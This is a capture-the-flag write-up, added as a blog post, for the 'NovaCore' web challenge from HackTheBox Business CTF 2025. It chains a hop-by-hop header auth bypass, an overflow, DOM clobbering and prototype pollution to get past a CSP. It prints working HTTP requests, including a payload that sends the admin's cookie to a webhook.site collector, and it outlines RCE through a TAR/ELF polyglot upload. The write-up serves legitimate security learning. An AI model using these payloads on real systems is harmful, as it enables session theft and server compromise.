@@ -1,0 +1,116 @@
+---
+layout: post
+title: NovaCore
+category: HackTheBox Business CTF 2025
+---
+
+## Introduction: The Attack Path
+
+This challenge was a masterclass in chaining multiple, distinct vulnerability classes to achieve a final goal. The exploit path was non-linear and required careful setup of multiple components before a final trigger could be pulled. The core of the challenge was bypassing a strict Content-Security-Policy (CSP) with a `nonce` to achieve XSS on the admin account. This was made possible by manipulating the logic of a front-end JavaScript file (`dashboard.js`) through a combination of DOM Clobbering and Prototype Pollution, which was itself set up using a memory corruption vulnerability.
+
+The full chain can be summarized as follows:
+1.  **Auth Bypass:** Become `sys_admin` using a hop-by-hop header bypass.
+2.  **Memory Corruption:** As `sys_admin`, create two trades. Use a memory overflow to creaate trade as `admin` user.
+3.  **Payload Planting (Part 1):** Edit the now admin-owned trade to inject a DOM Clobbering payload. This payload won't execute directly but will manipulate the DOM for a later script.
+4.  **Payload Planting (Part 2):** Use an unauthenticated `/front_end_error/new/{name}` endpoint to store a JSON object containing a Prototype Pollution payload.
+5.  **Triggering the Chain:** When the admin bot visit the compromised trade, the DOM Clobbering payload trigger the catch error in `dashboard.js`.
+6.  **CSP/Nonce Bypass:** The script's error handling logic is manipulated:
+    * DOM Clobbering makes the script check `window.UI_DEV_MODE` pass.
+    * A path traversal, also injected via DOM Clobbering, forces the script to `fetch` our pre-planted Prototype Pollution payload from `/front_end_error/view/{name}` instead of reporting a new error.
+    * The fetched JSON is parsed and merged, triggering the Prototype Pollution.
+    * The polluted prototype value is passed into an `eval()`, executing our XSS payload and exfiltrating the admin's session cookie.
+7.  **Remote Code Execution:** Use the stolen admin cookie to authenticate to a plugin upload endpoint and upload a specially crafted TAR/ELF polyglot file to bypass file validation and gain RCE.
+
+---
+
+## Step-by-Step Exploit Breakdown
+
+### Step 1: Authentication Bypass via Hop-by-Hop Headers
+
+Initial access was gained by exploiting how the application's reverse proxy handled hop-by-hop headers. By including `X-Real-IP` in the `Connection` header, the proxy would strip this header before forwarding the request to the backend. However, it would still process the `X-Real-IP` header itself. By setting `X-Real-IP: 127.0.0.1`, the backend application trusted the header and granted us `sys_admin` privileges.
+
+The key headers were:
+```http
+X-Real-IP: 127.0.0.1
+Connection: close, X-Real-IP
+```
+
+### Step 2: Gaining Control via Memory Corruption
+
+With `sys_admin` access, we could create trades. The vulnerability lay in the `edit_trade` function, which was susceptible to a overflow in the `symbol` parameter. This allowed us to overwrite the data of an adjacent trade object in memory.
+
+The request to perform the overflow looked like this:
+
+```http
+POST /api/edit_trade HTTP/1.1
+Host: 83.136.252.78:51714
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+X-Real-IP: 127.0.0.1
+Connection: close, X-Real-IP
+Content-Length: 387
+Content-Type: application/json
+
+{
+    "trade_id": "0b8618b8-d93d-44d0-ac5f-aaf69b7e3e31", 
+    "symbol": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuser:1:trade:cb474955-6761-494e-a050-aa7993403fd6"
+ 
+}
+```
+
+### Step 3: Planting the Payloads
+
+Now that we controlled an admin's trade, we needed to plant two different payloads.
+
+#### A. The DOM Clobbering Payload
+
+We edited the trade to include an HTML payload in its `symbol`.
+
+```http
+POST /api/edit_trade HTTP/1.1
+Host: 83.136.252.78:51714
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+X-Real-IP: 127.0.0.1
+Connection: close, X-Real-IP
+Content-Length: 266
+Content-Type: application/json
+
+{
+    "trade_id": "cb474955-6761-494e-a050-aa7993403fd6", 
+    "symbol": "<form/name=\"getElementById\"/value=\"test\"></form><a/id=\"UI_DEV_MODE\"></a><anything/id=\"LOG_LEVEL\"/int=\"../view/random\"></anything>",
+    "action": "BUY",
+    "price": "1.0"
+}
+```
+
+#### B. The Prototype Pollution Payload
+
+Next, we used the `/front_end_error` endpoint to store our final XSS payload within a JSON structure.
+
+```http
+POST /front_end_error/new/random HTTP/1.1
+Host: 83.136.252.78:51714
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+X-Real-IP: 127.0.0.1
+Connection: close, X-Real-IP
+Content-Length: 117
+Content-Type: application/json
+
+{"__proto__":{"length":"(location='https://webhook.site/xxxxxxx/?c='+document.cookie)"}}
+```
+
+### Step 4: Triggering the Exploit Chain
+
+With all the pieces in place, the exploit triggers automatically when the admin user visits their dashboard and views the compromised trade. This causes the chain of events described previously: the DOM is clobbered, a controlled error occurs, the error handler fetches our Prototype Pollution payload via a path traversal, the `Object.prototype` is polluted, and finally, `eval()` executes our code, stealing the admin's cookie.
+
+### Step 5: Post-Exploitation to RCE
+
+With the admin's session cookie, we authenticated to the application as the admin. We discovered a plugin upload feature at a `/run_plugin` endpoint. To bypass the backend `tar` and `readelf` checks, we crafted a polyglot file that was simultaneously a valid TAR archive and a valid ELF executable. Uploading and executing this polyglot file bypassed the validation and gave us Remote Code Execution on the server.
+
+---
+
+## Conclusion
+
+The `web_novacore` challenge was a formidable and deeply rewarding experience. It brilliantly wove together an array of advanced web vulnerabilities, demanding a thorough understanding of not just each individual flaw, but precisely how they could be chained together. The reliance on DOM Clobbering to pivot to Prototype Pollution as a CSP bypass was particularly ingenious. This was a true "final boss" web challenge.
